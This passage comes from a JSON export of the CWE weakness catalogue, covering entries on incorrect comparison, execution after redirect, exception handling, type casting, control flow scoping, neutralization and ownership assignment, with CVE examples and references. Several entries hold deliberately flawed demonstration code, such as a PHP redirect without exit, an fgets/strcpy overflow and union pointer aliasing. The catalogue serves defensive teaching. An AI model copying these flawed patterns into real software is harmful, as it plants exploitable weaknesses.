              "ExampleCode": "```\n\tp\n\tpa\n\tpas\n\tpass\n```"
            },
            {
              "BodyText": "This significantly reduces the search space for an attacker, making brute force attacks more feasible."
            },
            {
              "BodyText": "The same problem also applies to the username, so values such as \"a\" and \"adm\" will succeed for the username."
            },
            {
              "BodyText": "While this demonstrative example may not seem realistic, see the Observed Examples for CVE entries that effectively reflect this same weakness."
            }
          ]
        }
      ],
      "ObservedExamples": [
        {
          "Reference": "CVE-2021-3116",
          "Description": "Chain: Python-based HTTP Proxy server uses the wrong boolean operators (CWE-480) causing an incorrect comparison (CWE-697) that identifies an authN failure if all three conditions are met instead of only one, allowing bypass of the proxy authentication (CWE-1390)",
          "Link": "https://www.cve.org/CVERecord?id=CVE-2021-3116"
        },
        {
          "Reference": "CVE-2020-15811",
          "Description": "Chain: Proxy uses a substring search instead of parsing the Transfer-Encoding header (CWE-697), allowing request splitting (CWE-113) and cache poisoning",
          "Link": "https://www.cve.org/CVERecord?id=CVE-2020-15811"
        },
        {
          "Reference": "CVE-2016-10003",
          "Description": "Proxy performs incorrect comparison of request headers, leading to infoleak",
          "Link": "https://www.cve.org/CVERecord?id=CVE-2016-10003"
        }
      ],
      "RelatedAttackPatterns": [
        "10",
        "120",
        "14",
        "15",
        "182",
        "24",
        "267",
        "3",
        "41",
        "43",
        "44",
        "45",
        "46",
        "47",
        "52",
        "53",
        "6",
        "64",
        "67",
        "7",
        "71",
        "73",
        "78",
        "79",
        "8",
        "80",
        "88",
        "9",
        "92"
      ],
      "MappingNotes": {
        "Usage": "Discouraged",
        "Rationale": "This CWE entry is extremely high-level, a Pillar. However, sometimes this weakness is forced to be used due to the lack of in-depth weakness research. See Research Gaps.",
        "Comments": "Where feasible, consider children or descendants of this entry instead.",
        "Reasons": [
          "Abstraction"
        ]
      },
      "Notes": [
        {
          "Type": "Research Gap",
          "Note": "\n\nWeaknesses related to this Pillar appear to be under-studied, especially with respect to classification schemes. Input from academic and other communities could help identify and resolve gaps or organizational difficulties within CWE.\n"
        },
        {
          "Type": "Maintenance",
          "Note": "This entry likely has some relationships with case sensitivity (CWE-178), but case sensitivity is a factor in other types of weaknesses besides comparison. Also, in cryptography, certain attacks are possible when certain comparison operations do not take place in constant time, causing a timing-related information leak (CWE-208)."
        }
      ]
    },
    {
      "ID": "698",
      "Name": "Execution After Redirect (EAR)",
      "Abstraction": "Base",
      "Structure": "Simple",
      "Status": "Incomplete",
      "Description": "The web application sends a redirect to another location, but instead of exiting, it executes additional code.",
      "RelatedWeaknesses": [
        {
          "Nature": "ChildOf",
          "CweID": "705",
          "ViewID": "1000",
          "Ordinal": "Primary"
        },
        {
          "Nature": "ChildOf",
          "CweID": "670",
          "ViewID": "1000"
        }
      ],
      "WeaknessOrdinalities": [
        {
          "Ordinality": "Primary"
        }
      ],
      "AlternateTerms": [
        {
          "Term": "Redirect Without Exit"
        }
      ],
      "ModesOfIntroduction": [
        {
          "Phase": "Implementation"
        }
      ],
      "CommonConsequences": [
        {
          "Scope": [
            "Other",
            "Confidentiality",
            "Integrity",
            "Availability"
          ],
          "Impact": [
            "Alter Execution Logic",
            "Execute Unauthorized Code or Commands"
          ],
          "Note": "This weakness could affect the control flow of the application and allow execution of untrusted code."
        }
      ],
      "DetectionMethods": [
        {
          "Method": "Black Box",
          "Description": "This issue might not be detected if testing is performed using a web browser, because the browser might obey the redirect and move the user to a different page before the application has produced outputs that indicate something is amiss."
        }
      ],
      "DemonstrativeExamples": [
        {
          "ID": "DX-180",
          "Entries": [
            {
              "IntroText": "This code queries a server and displays its status when a request comes from an authorized IP address."
            },
            {
              "Nature": "Bad",
              "Language": "PHP",
              "ExampleCode": "```\n\t$requestingIP = $_SERVER['REMOTE_ADDR'];\n\tif(!in_array($requestingIP,$ipAllowList)){\n\t\techo \"You are not authorized to view this page\";\n\t\thttp_redirect($errorPageURL);\n\t}\n\t$status = getServerStatus();\n\techo $status;\n```\n...*"
            },
            {
              "BodyText": "This code redirects unauthorized users, but continues to execute code after calling http_redirect(). This means even unauthorized users may be able to access the contents of the page or perform a DoS attack on the server being queried. Also, note that this code is vulnerable to an IP address spoofing attack (CWE-212)."
            }
          ]
        }
      ],
      "ObservedExamples": [
        {
          "Reference": "CVE-2013-1402",
          "Description": "Execution-after-redirect allows access to application configuration details.",
          "Link": "https://www.cve.org/CVERecord?id=CVE-2013-1402"
        },
        {
          "Reference": "CVE-2009-1936",
          "Description": "chain: library file sends a redirect if it is directly requested but continues to execute, allowing remote file inclusion and path traversal.",
          "Link": "https://www.cve.org/CVERecord?id=CVE-2009-1936"
        },
        {
          "Reference": "CVE-2007-2713",
          "Description": "Remote attackers can obtain access to administrator functionality through EAR.",
          "Link": "https://www.cve.org/CVERecord?id=CVE-2007-2713"
        },
        {
          "Reference": "CVE-2007-4932",
          "Description": "Remote attackers can obtain access to administrator functionality through EAR.",
          "Link": "https://www.cve.org/CVERecord?id=CVE-2007-4932"
        },
        {
          "Reference": "CVE-2007-5578",
          "Description": "Bypass of authentication step through EAR.",
          "Link": "https://www.cve.org/CVERecord?id=CVE-2007-5578"
        },
        {
          "Reference": "CVE-2007-2713",
          "Description": "Chain: Execution after redirect triggers eval injection.",
          "Link": "https://www.cve.org/CVERecord?id=CVE-2007-2713"
        },
        {
          "Reference": "CVE-2007-6652",
          "Description": "chain: execution after redirect allows non-administrator to perform static code injection.",
          "Link": "https://www.cve.org/CVERecord?id=CVE-2007-6652"
        }
      ],
      "References": [
        {
          "ExternalReferenceID": "REF-565",
          "Authors": [
            "Adam Doup\u00e9",
            "Bryce Boe",
            "Christopher Kruegel",
            "Giovanni Vigna"
          ],
          "Title": "Fear the EAR: Discovering and Mitigating Execution After Redirect Vulnerabilities",
          "URL": "http://cs.ucsb.edu/~bboe/public/pubs/fear-the-ear-ccs2011.pdf"
        }
      ],
      "MappingNotes": {
        "Usage": "Allowed",
        "Rationale": "This CWE entry is at the Base level of abstraction, which is a preferred level of abstraction for mapping to the root causes of vulnerabilities.",
        "Comments": "Carefully read both the name and description to ensure that this mapping is an appropriate fit. Do not try to 'force' a mapping to a lower-level Base/Variant simply to comply with this preferred level of abstraction.",
        "Reasons": [
          "Acceptable-Use"
        ]
      }
    },
    {
      "ID": "703",
      "Name": "Improper Check or Handling of Exceptional Conditions",
      "Abstraction": "Pillar",
      "Structure": "Simple",
      "Status": "Incomplete",
      "Description": "The product does not properly anticipate or handle exceptional conditions that rarely occur during normal operation of the product.",
      "ApplicablePlatforms": [
        {
          "Type": "Language",
          "Class": "Not Language-Specific",
          "Prevalence": "Undetermined"
        },
        {
          "Type": "Technology",
          "Class": "Not Technology-Specific",
          "Prevalence": "Undetermined"
        }
      ],
      "ModesOfIntroduction": [
        {
          "Phase": "Architecture and Design"
        },
        {
          "Phase": "Implementation",
          "Note": "REALIZATION: This weakness is caused during implementation of an architectural security tactic."
        },
        {
          "Phase": "Operation"
        }
      ],
      "CommonConsequences": [
        {
          "Scope": [
            "Confidentiality",
            "Availability",
            "Integrity"
          ],
          "Impact": [
            "Read Application Data",
            "DoS: Crash, Exit, or Restart",
            "Unexpected State"
          ]
        }
      ],
      "DetectionMethods": [
        {
          "Method": "Dynamic Analysis with Manual Results Interpretation",
          "Description": "\n\nAccording to SOAR, the following detection techniques may be useful:\n\n```\n\t\tHighly cost effective:\n```\n\n\t\tFault Injection - source code\n\t\tFault Injection - binary\n\t```\n\t\tCost effective for partial coverage:\n```\n\n\t\tForced Path Execution",
          "Effectiveness": "High"
        },
        {
          "Method": "Manual Static Analysis - Source Code",
          "Description": "\n\nAccording to SOAR, the following detection techniques may be useful:\n\n```\n\t\tHighly cost effective:\n```\n\n\t\tManual Source Code Review (not inspections)\n\t```\n\t\tCost effective for partial coverage:\n```\n\n\t\tFocused Manual Spotcheck - Focused manual analysis of source",
          "Effectiveness": "High"
        },
        {
          "Method": "Automated Static Analysis - Source Code",
          "Description": "\n\nAccording to SOAR, the following detection techniques may be useful:\n\n```\n\t\tCost effective for partial coverage:\n```\n\n\t\tSource code Weakness Analyzer\n\t\tContext-configured Source Code Weakness Analyzer",
          "Effectiveness": "SOAR Partial"
        },
        {
          "Method": "Architecture or Design Review",
          "Description": "\n\nAccording to SOAR, the following detection techniques may be useful:\n\n```\n\t\tHighly cost effective:\n```\n\n\t\tInspection (IEEE 1028 standard) (can apply to requirements, design, source code, etc.)\n\t\tFormal Methods / Correct-By-Construction",
          "Effectiveness": "High"
        }
      ],
      "DemonstrativeExamples": [
        {
          "ID": "DX-7",
          "Entries": [
            {
              "IntroText": "Consider the following code segment:"
            },
            {
              "Nature": "Bad",
              "Language": "C",
              "ExampleCode": "```\n\tchar buf[10], cp_buf[10];\n\tfgets(buf, 10, stdin);\n\tstrcpy(cp_buf, buf);\n```"
            },
            {
              "BodyText": "The programmer expects that when fgets() returns, buf will contain a null-terminated string of length 9 or less. But if an I/O error occurs, fgets() will not null-terminate buf. Furthermore, if the end of the file is reached before any characters are read, fgets() returns without writing anything to buf. In both of these situations, fgets() signals that something unusual has happened by returning NULL, but in this code, the warning will not be noticed. The lack of a null terminator in buf can result in a buffer overflow in the subsequent call to strcpy()."
            }
          ]
        },
        {
          "ID": "DX-198",
          "Entries": [
            {
              "IntroText": "The following method throws three types of exceptions."
            },
            {
              "Nature": "Good",
              "Language": "Java",
              "ExampleCode": "```\n\tpublic void doExchange() throws IOException, InvocationTargetException, SQLException {\n\t\t...\n\t}\n```"
            },
            {
              "BodyText": "While it might seem tidier to write"
            },
            {
              "Nature": "Bad",
              "ExampleCode": "```\n\tpublic void doExchange() throws Exception {\n\t\t...\n\t}\n```"
            },
            {
              "BodyText": "doing so hampers the caller's ability to understand and handle the exceptions that occur. Further, if a later revision of doExchange() introduces a new type of exception that should be treated differently than previous exceptions, there is no easy way to enforce this requirement."
            }
          ]
        }
      ],
      "ObservedExamples": [
        {
          "Reference": "[REF-1374]",
          "Description": "Chain: JavaScript-based cryptocurrency library can fall back to the insecure Math.random() function instead of reporting a failure (CWE-392), thus reducing the entropy (CWE-332) and leading to generation of non-unique cryptographic keys for Bitcoin wallets (CWE-1391)",
          "Link": "https://www.unciphered.com/blog/randstorm-you-cant-patch-a-house-of-cards"
        },
        {
          "Reference": "CVE-2022-22224",
          "Description": "Chain: an operating system does not properly process malformed Open Shortest Path First (OSPF) Type/Length/Value Identifiers (TLV) (CWE-703), which can cause the process to enter an infinite loop (CWE-835)",
          "Link": "https://www.cve.org/CVERecord?id=CVE-2022-22224"
        }
      ],
      "TaxonomyMappings": [
        {
          "TaxonomyName": "The CERT Oracle Secure Coding Standard for Java (2011)",
          "EntryID": "ERR06-J",
          "EntryName": "Do not throw undeclared checked exceptions"
        }
      ],
      "References": [
        {
          "ExternalReferenceID": "REF-567",
          "Authors": [
            "Taimur Aslam"
          ],
          "Title": "A Taxonomy of Security Faults in the UNIX Operating System",
          "PublicationYear": "1995",
          "PublicationMonth": "08",
          "PublicationDay": "01",
          "URL": "http://ftp.cerias.purdue.edu/pub/papers/taimur-aslam/aslam-taxonomy-msthesis.pdf"
        },
        {
          "ExternalReferenceID": "REF-568",
          "Authors": [
            "Taimur Aslam",
            "Ivan Krsul",
            "Eugene H. Spafford"
          ],
          "Title": "Use of A Taxonomy of Security Faults",
          "PublicationYear": "1995",
          "PublicationMonth": "08",
          "PublicationDay": "01",
          "URL": "https://csrc.nist.gov/csrc/media/publications/conference-paper/1996/10/22/proceedings-of-the-19th-nissc-1996/documents/paper057/paper.pdf",
          "URLDate": "2023-04-07"
        },
        {
          "ExternalReferenceID": "REF-44",
          "Section": "\"Sin 8: C++ Catastrophes.\" Page 143",
          "Authors": [
            "Michael Howard",
            "David LeBlanc",
            "John Viega"
          ],
          "Title": "24 Deadly Sins of Software Security",
          "Publication": "McGraw-Hill",
          "PublicationYear": "2010"
        },
        {
          "ExternalReferenceID": "REF-1374",
          "Authors": [
            "Unciphered"
          ],
          "Title": "Randstorm: You Can't Patch a House of Cards",
          "PublicationYear": "2023",
          "PublicationMonth": "11",
          "PublicationDay": "14",
          "URL": "https://www.unciphered.com/blog/randstorm-you-cant-patch-a-house-of-cards",
          "URLDate": "2023-11-15"
        }
      ],
      "MappingNotes": {
        "Usage": "Discouraged",
        "Rationale": "This CWE entry is extremely high-level, a Pillar.",
        "Comments": "Consider children or descendants of this entry instead.",
        "Reasons": [
          "Abstraction"
        ]
      },
      "Notes": [
        {
          "Type": "Relationship",
          "Note": "This is a high-level class that might have some overlap with other classes. It could be argued that even \"normal\" weaknesses such as buffer overflows involve unusual or exceptional conditions. In that sense, this might be an inherent aspect of most other weaknesses within CWE, similar to API Abuse (CWE-227) and Indicator of Poor Code Quality (CWE-398). However, this entry is currently intended to unify disparate concepts that do not have other places within the Research Concepts view (CWE-1000)."
        }
      ]
    },
    {
      "ID": "704",
      "Name": "Incorrect Type Conversion or Cast",
      "Abstraction": "Class",
      "Structure": "Simple",
      "Status": "Incomplete",
      "Description": "The product does not correctly convert an object, resource, or structure from one type to a different type.",
      "RelatedWeaknesses": [
        {
          "Nature": "ChildOf",
          "CweID": "664",
          "ViewID": "1000",
          "Ordinal": "Primary"
        }
      ],
      "ApplicablePlatforms": [
        {
          "Type": "Language",
          "Name": "C",
          "Prevalence": "Often"
        },
        {
          "Type": "Language",
          "Name": "C++",
          "Prevalence": "Often"
        },
        {
          "Type": "Language",
          "Class": "Not Language-Specific",
          "Prevalence": "Undetermined"
        }
      ],
      "ModesOfIntroduction": [
        {
          "Phase": "Implementation"
        }
      ],
      "CommonConsequences": [
        {
          "Scope": [
            "Other"
          ],
          "Impact": [
            "Other"
          ]
        }
      ],
      "DetectionMethods": [
        {
          "DetectionMethodID": "DM-13",
          "Method": "Fuzzing",
          "Description": "Fuzz testing (fuzzing) is a powerful technique for generating large numbers of diverse inputs - either randomly or algorithmically - and dynamically invoking the code with those inputs. Even with random inputs, it is often capable of generating unexpected results such as crashes, memory corruption, or resource consumption. Fuzzing effectively produces repeatable test cases that clearly indicate bugs, which helps developers to diagnose the issues.",
          "Effectiveness": "High"
        }
      ],
      "DemonstrativeExamples": [
        {
          "ID": "DX-74",
          "Entries": [
            {
              "IntroText": "In this example, depending on the return value of accecssmainframe(), the variable amount can hold a negative value when it is returned. Because the function is declared to return an unsigned value, amount will be implicitly cast to an unsigned number."
            },
            {
              "Nature": "Bad",
              "Language": "C",
              "ExampleCode": "```\n\tunsigned int readdata () {\n\t\tint amount = 0;\n\t\t...\n\t\tamount = accessmainframe();\n\t\t...\n\t\treturn amount;\n\t}\n```"
            },
            {
              "BodyText": "If the return value of accessmainframe() is -1, then the return value of readdata() will be 4,294,967,295 on a system that uses 32-bit integers."
            }
          ]
        },
        {
          "ID": "DX-188",
          "Entries": [
            {
              "IntroText": "The following code uses a union to support the representation of different types of messages. It formats messages differently, depending on their type."
            },
            {
              "Nature": "Bad",
              "Language": "C",
              "ExampleCode": "```\n\t#define NAME_TYPE 1\n\t#define ID_TYPE 2\n\tstruct MessageBuffer\n\t{\n\t\tint msgType;\n\t\tunion {\n\t\t\tchar *name;\n\t\t\tint nameID;\n\t\t};\n\t};\n\tint main (int argc, char **argv) {\n\t\t\tstruct MessageBuffer buf;\n\t\t\tchar *defaultMessage = \"Hello World\";\n\t\t\tbuf.msgType = NAME_TYPE;\n\t\t\tbuf.name = defaultMessage;\n\t\t\tprintf(\"Pointer of buf.name is %p\\n\", buf.name);\n```\n/* This particular value for nameID is used to make the code architecture-independent. If coming from untrusted input, it could be any value. */* \n\t\t\t\n\t\t\tbuf.nameID = (int)(defaultMessage + 1);\n\t\t\tprintf(\"Pointer of buf.name is now %p\\n\", buf.name);\n\t\t\tif (buf.msgType == NAME_TYPE) {\n\t\t\t```\n\t\t\t\tprintf(\"Message: %s\\n\", buf.name);\n\t\t\t}\n\t\t\telse {\n\t\t\t\tprintf(\"Message: Use ID %d\\n\", buf.nameID);\n\t\t\t}\n\t}\n```"
            },
            {
              "BodyText": "The code intends to process the message as a NAME_TYPE, and sets the default message to \"Hello World.\" However, since both buf.name and buf.nameID are part of the same union, they can act as aliases for the same memory location, depending on memory layout after compilation."
            },
            {
              "BodyText": "As a result, modification of buf.nameID - an int - can effectively modify the pointer that is stored in buf.name - a string."
            },
            {
              "BodyText": "Execution of the program might generate output such as:"
            },
            {
              "BodyText": "```\n\t\tPointer of name is 10830\n\t\tPointer of name is now 10831\n\t\tMessage: ello World\n```"
            },
            {
              "BodyText": "Notice how the pointer for buf.name was changed, even though buf.name was not explicitly modified."
            },
            {
              "BodyText": "In this case, the first \"H\" character of the message is omitted. However, if an attacker is able to fully control the value of buf.nameID, then buf.name could contain an arbitrary pointer, leading to out-of-bounds reads or writes."
            }
          ]
        }
      ],
      "ObservedExamples": [
        {
          "Reference": "CVE-2021-43537",
          "Description": "Chain: in a web browser, an unsigned 64-bit integer is forcibly cast to a 32-bit integer (CWE-681) and potentially leading to an integer overflow (CWE-190). If an integer overflow occurs, this can cause heap memory corruption (CWE-122)",
          "Link": "https://www.cve.org/CVERecord?id=CVE-2021-43537"
        },
        {
          "Reference": "CVE-2022-3979",
          "Description": "Chain: data visualization program written in PHP uses the \"!=\" operator instead of the type-strict \"!==\" operator (CWE-480) when validating hash values, potentially leading to an incorrect type conversion (CWE-704)",
          "Link": "https://www.cve.org/CVERecord?id=CVE-2022-3979"
        }
      ],
      "TaxonomyMappings": [
        {
          "TaxonomyName": "CERT C Secure Coding",
          "EntryID": "EXP05-C",
          "EntryName": "Do not cast away a const qualification"
        },
        {
          "TaxonomyName": "CERT C Secure Coding",
          "EntryID": "EXP39-C",
          "EntryName": "Do not access a variable through a pointer of an incompatible type",
          "MappingFit": "CWE More Abstract"
        },
        {
          "TaxonomyName": "CERT C Secure Coding",
          "EntryID": "INT31-C",
          "EntryName": "Ensure that integer conversions do not result in lost or misinterpreted data",
          "MappingFit": "CWE More Abstract"
        },
        {
          "TaxonomyName": "CERT C Secure Coding",
          "EntryID": "INT36-C",
          "EntryName": "Converting a pointer to integer or integer to pointer",
          "MappingFit": "CWE More Abstract"
        },
        {
          "TaxonomyName": "CERT C Secure Coding",
          "EntryID": "STR34-C",
          "EntryName": "Cast characters to unsigned types before converting to larger integer sizes",
          "MappingFit": "CWE More Abstract"
        },
        {
          "TaxonomyName": "CERT C Secure Coding",
          "EntryID": "STR37-C",
          "EntryName": "Arguments to character handling functions must be representable as an unsigned char",
          "MappingFit": "CWE More Abstract"
        },
        {
          "TaxonomyName": "Software Fault Patterns",
          "EntryID": "SFP1",
          "EntryName": "Glitch in computation"
        },
        {
          "TaxonomyName": "OMG ASCRM",
          "EntryID": "ASCRM-CWE-704"
        }
      ],
      "References": [
        {
          "ExternalReferenceID": "REF-961",
          "Section": "ASCRM-CWE-704",
          "Authors": [
            "Object Management Group (OMG)"
          ],
          "Title": "Automated Source Code Reliability Measure (ASCRM)",
          "PublicationYear": "2016",
          "PublicationMonth": "01",
          "URL": "http://www.omg.org/spec/ASCRM/1.0/"
        }
      ],
      "MappingNotes": {
        "Usage": "Allowed-with-Review",
        "Rationale": "This CWE entry is a Class and might have Base-level children that would be more appropriate",
        "Comments": "Examine children of this entry to see if there is a better fit",
        "Reasons": [
          "Abstraction"
        ]
      }
    },
    {
      "ID": "705",
      "Name": "Incorrect Control Flow Scoping",
      "Abstraction": "Class",
      "Structure": "Simple",
      "Status": "Incomplete",
      "Description": "The product does not properly return control flow to the proper location after it has completed a task or detected an unusual condition.",
      "RelatedWeaknesses": [
        {
          "Nature": "ChildOf",
          "CweID": "691",
          "ViewID": "1000",
          "Ordinal": "Primary"
        }
      ],
      "ApplicablePlatforms": [
        {
          "Type": "Language",
          "Class": "Not Language-Specific",
          "Prevalence": "Undetermined"
        }
      ],
      "ModesOfIntroduction": [
        {
          "Phase": "Implementation"
        }
      ],
      "CommonConsequences": [
        {
          "Scope": [
            "Other"
          ],
          "Impact": [
            "Alter Execution Logic",
            "Other"
          ]
        }
      ],
      "DemonstrativeExamples": [
        {
          "ID": "DX-39",
          "Entries": [
            {
              "IntroText": "The following example attempts to resolve a hostname."
            },
            {
              "Nature": "Bad",
              "Language": "Java",
              "ExampleCode": "```\n\tprotected void doPost (HttpServletRequest req, HttpServletResponse res) throws IOException {\n\t\tString ip = req.getRemoteAddr();\n\t\tInetAddress addr = InetAddress.getByName(ip);\n\t\t...\n\t\tout.println(\"hello \" + addr.getHostName());\n\t}\n```"
            },
            {
              "BodyText": "A DNS lookup failure will cause the Servlet to throw an exception."
            }
          ]
        },
        {
          "ID": "DX-180",
          "Entries": [
            {
              "IntroText": "This code queries a server and displays its status when a request comes from an authorized IP address."
            },
            {
              "Nature": "Bad",
              "Language": "PHP",
              "ExampleCode": "```\n\t$requestingIP = $_SERVER['REMOTE_ADDR'];\n\tif(!in_array($requestingIP,$ipAllowList)){\n\t\techo \"You are not authorized to view this page\";\n\t\thttp_redirect($errorPageURL);\n\t}\n\t$status = getServerStatus();\n\techo $status;\n```\n...*"
            },
            {
              "BodyText": "This code redirects unauthorized users, but continues to execute code after calling http_redirect(). This means even unauthorized users may be able to access the contents of the page or perform a DoS attack on the server being queried. Also, note that this code is vulnerable to an IP address spoofing attack (CWE-212)."
            }
          ]
        },
        {
          "ID": "DX-199",
          "Entries": [
            {
              "IntroText": "Included in the doPost() method defined below is a call to System.exit() in the event of a specific exception."
            },
            {
              "Nature": "Bad",
              "Language": "Java",
              "ExampleCode": "```\n\tPublic void doPost(HttpServletRequest request, HttpServletResponse response) throws ServletException, IOException {\n\t\ttry {\n\t\t\t...\n\t\t} catch (ApplicationSpecificException ase) {\n\t\t\tlogger.error(\"Caught: \" + ase.toString());\n\t\t\tSystem.exit(1);\n\t\t}\n\t}\n```"
            }
          ]
        }
      ],
      "ObservedExamples": [
        {
          "Reference": "CVE-2023-21087",
          "Description": "Java code in a smartphone OS can encounter a \"boot loop\" due to an uncaught exception",
          "Link": "https://www.cve.org/CVERecord?id=CVE-2023-21087"
        },
        {
          "Reference": "CVE-2014-1266",
          "Description": "chain: incorrect \"goto\" in Apple SSL product bypasses certificate validation, allowing Adversary-in-the-Middle (AITM) attack (Apple \"goto fail\" bug). CWE-705 (Incorrect Control Flow Scoping) -> CWE-561 (Dead Code) -> CWE-295 (Improper Certificate Validation) -> CWE-393 (Return of Wrong Status Code) -> CWE-300 (Channel Accessible by Non-Endpoint).",
          "Link": "https://www.cve.org/CVERecord?id=CVE-2014-1266"
        }
      ],
      "TaxonomyMappings": [
        {
          "TaxonomyName": "CERT C Secure Coding",
          "EntryID": "ENV32-C",
          "EntryName": "All exit handlers must return normally",
          "MappingFit": "CWE More Abstract"
        },
        {
          "TaxonomyName": "CERT C Secure Coding",
          "EntryID": "ERR04-C",
          "EntryName": "Choose an appropriate termination strategy"
        },
        {
          "TaxonomyName": "The CERT Oracle Secure Coding Standard for Java (2011)",
          "EntryID": "THI05-J",
          "EntryName": "Do not use Thread.stop() to terminate threads"
        },
        {
          "TaxonomyName": "The CERT Oracle Secure Coding Standard for Java (2011)",
          "EntryID": "ERR04-J",
          "EntryName": "Do not complete abruptly from a finally block"
        },
        {
          "TaxonomyName": "The CERT Oracle Secure Coding Standard for Java (2011)",
          "EntryID": "ERR05-J",
          "EntryName": "Do not let checked exceptions escape from a finally block"
        },
        {
          "TaxonomyName": "SEI CERT Perl Coding Standard",
          "EntryID": "EXP31-PL",
          "EntryName": "Do not suppress or ignore exceptions",
          "MappingFit": "Imprecise"
        }
      ],
      "MappingNotes": {
        "Usage": "Allowed-with-Review",
        "Rationale": "This CWE entry is a Class and might have Base-level children that would be more appropriate",
        "Comments": "Examine children of this entry to see if there is a better fit",
        "Reasons": [
          "Abstraction"
        ]
      }
    },
    {
      "ID": "706",
      "Name": "Use of Incorrectly-Resolved Name or Reference",
      "Abstraction": "Class",
      "Structure": "Simple",
      "Status": "Incomplete",
      "Description": "The product uses a name or reference to access a resource, but the name/reference resolves to a resource that is outside of the intended control sphere.",
      "RelatedWeaknesses": [
        {
          "Nature": "ChildOf",
          "CweID": "664",
          "ViewID": "1000",
          "Ordinal": "Primary"
        },
        {
          "Nature": "PeerOf",
          "CweID": "99",
          "ViewID": "1000"
        }
      ],
      "ApplicablePlatforms": [
        {
          "Type": "Language",
          "Class": "Not Language-Specific",
          "Prevalence": "Undetermined"
        }
      ],
      "ModesOfIntroduction": [
        {
          "Phase": "Architecture and Design"
        },
        {
          "Phase": "Implementation"
        }
      ],
      "CommonConsequences": [
        {
          "Scope": [
            "Confidentiality",
            "Integrity"
          ],
          "Impact": [
            "Read Application Data",
            "Modify Application Data"
          ]
        }
      ],
      "RelatedAttackPatterns": [
        "159",
        "177",
        "48",
        "641"
      ],
      "MappingNotes": {
        "Usage": "Allowed-with-Review",
        "Rationale": "This CWE entry is a Class and might have Base-level children that would be more appropriate",
        "Comments": "Examine children of this entry to see if there is a better fit",
        "Reasons": [
          "Abstraction"
        ]
      }
    },
    {
      "ID": "707",
      "Name": "Improper Neutralization",
      "Abstraction": "Pillar",
      "Structure": "Simple",
      "Status": "Incomplete",
      "Description": "The product does not ensure or incorrectly ensures that structured messages or data are well-formed and that certain security properties are met before being read from an upstream component or sent to a downstream component.",
      "ExtendedDescription": "\n\nIf a message is malformed, it may cause the message to be incorrectly interpreted.\n\n\nNeutralization is an abstract term for any technique that ensures that input (and output) conforms with expectations and is \"safe.\" This can be done by:\n\n\n  - checking that the input/output is already \"safe\" (e.g. validation)\n\n  - transformation of the input/output to be \"safe\" using techniques such as filtering, encoding/decoding, escaping/unescaping, quoting/unquoting, or canonicalization\n\n  - preventing the input/output from being directly provided by an attacker (e.g. \"indirect selection\" that maps externally-provided values to internally-controlled values)\n\n  - preventing the input/output from being processed at all\n\nThis weakness typically applies in cases where the product prepares a control message that another process must act on, such as a command or query, and malicious input that was intended as data, can enter the control plane instead. However, this weakness also applies to more general cases where there are not always control implications.",
      "ApplicablePlatforms": [
        {
          "Type": "Language",
          "Class": "Not Language-Specific",
          "Prevalence": "Undetermined"
        },
        {
          "Type": "Operating_System",
          "Class": "Not OS-Specific",
          "Prevalence": "Undetermined"
        },
        {
          "Type": "Architecture",
          "Class": "Not Architecture-Specific",
          "Prevalence": "Undetermined"
        },
        {
          "Type": "Technology",
          "Class": "Not Technology-Specific",
          "Prevalence": "Undetermined"
        }
      ],
      "ModesOfIntroduction": [
        {
          "Phase": "Implementation",
          "Note": "REALIZATION: This weakness is caused during implementation of an architectural security tactic."
        }
      ],
      "CommonConsequences": [
        {
          "Scope": [
            "Other"
          ],
          "Impact": [
            "Other"
          ]
        }
      ],
      "RelatedAttackPatterns": [
        "250",
        "276",
        "277",
        "278",
        "279",
        "3",
        "43",
        "468",
        "52",
        "53",
        "64",
        "7",
        "78",
        "79",
        "83",
        "84"
      ],
      "MappingNotes": {
        "Usage": "Discouraged",
        "Rationale": "This CWE entry is extremely high-level, a Pillar.",
        "Comments": "Consider children or descendants of this entry instead.",
        "Reasons": [
          "Abstraction"
        ]
      },
      "Notes": [
        {
          "Type": "Maintenance",
          "Note": "Concepts such as validation, data transformation, and neutralization are being refined, so relationships between CWE-20 and other entries such as CWE-707 may change in future versions, along with an update to the Vulnerability Theory document."
        }
      ]
    },
    {
      "ID": "708",
      "Name": "Incorrect Ownership Assignment",
      "Abstraction": "Base",
      "Structure": "Simple",
      "Status": "Incomplete",
      "Description": "The product assigns an owner to a resource, but the owner is outside of the intended control sphere.",
      "ExtendedDescription": "This may allow the resource to be manipulated by actors outside of the intended control sphere.",
      "RelatedWeaknesses": [
        {
          "Nature": "ChildOf",
          "CweID": "282",
          "ViewID": "1000",
          "Ordinal": "Primary"
        },
        {
          "Nature": "CanAlsoBe",
          "CweID": "345",
          "ViewID": "1000"
        }
      ],
      "ApplicablePlatforms": [
        {
          "Type": "Language",
          "Class": "Not Language-Specific",
          "Prevalence": "Undetermined"
        }
      ],
      "ModesOfIntroduction": [
        {
          "Phase": "Architecture and Design"
        },
        {
          "Phase": "Implementation",
          "Note": "REALIZATION: This weakness is caused during implementation of an architectural security tactic."
        },
        {
          "Phase": "Operation"
        }
      ],
      "CommonConsequences": [
        {
          "Scope": [
            "Confidentiality",
            "Integrity"
          ],
          "Impact": [
            "Read Application Data",
            "Modify Application Data"
          ],
          "Note": "An attacker could read and modify data for which they do not have permissions to access directly."
        }
      ],
      "PotentialMitigations": [
        {
          "Phase": [
            "Policy"
          ],
          "Description": "Periodically review the privileges and their owners."
        },
        {
          "Phase": [
            "Testing"
          ],
          "Description": "Use automated tools to check for privilege settings."
        }
      ],
      "ObservedExamples": [
        {
          "Reference": "CVE-2007-5101",
          "Description": "File system sets wrong ownership and group when creating a new file.",
          "Link": "https://www.cve.org/CVERecord?id=CVE-2007-5101"
        },
        {
          "Reference": "CVE-2007-4238",
          "Description": "OS installs program with bin owner/group, allowing modification.",
          "Link": "https://www.cve.org/CVERecord?id=CVE-2007-4238"
        },
        {
          "Reference": "CVE-2007-1716",
          "Description": "Manager does not properly restore ownership of a reusable resource when a user logs out, allowing privilege escalation.",
          "Link": "https://www.cve.org/CVERecord?id=CVE-2007-1716"
        },
        {
          "Reference": "CVE-2005-3148",
          "Description": "Backup software restores symbolic links with incorrect uid/gid.",
          "Link": "https://www.cve.org/CVERecord?id=CVE-2005-3148"
        },
        {
          "Reference": "CVE-2005-1064",
          "Description": "Product changes the ownership of files that a symlink points to, instead of the symlink itself.",
          "Link": "https://www.cve.org/CVERecord?id=CVE-2005-1064"
        },
        {
          "Reference": "CVE-2011-1551",
          "Description": "Component assigns ownership of sensitive directory tree to a user account, which can be leveraged to perform privileged operations.",
          "Link": "https://www.cve.org/CVERecord?id=CVE-2011-1551"
        }
      ],
      "MappingNotes": {
        "Usage": "Allowed",
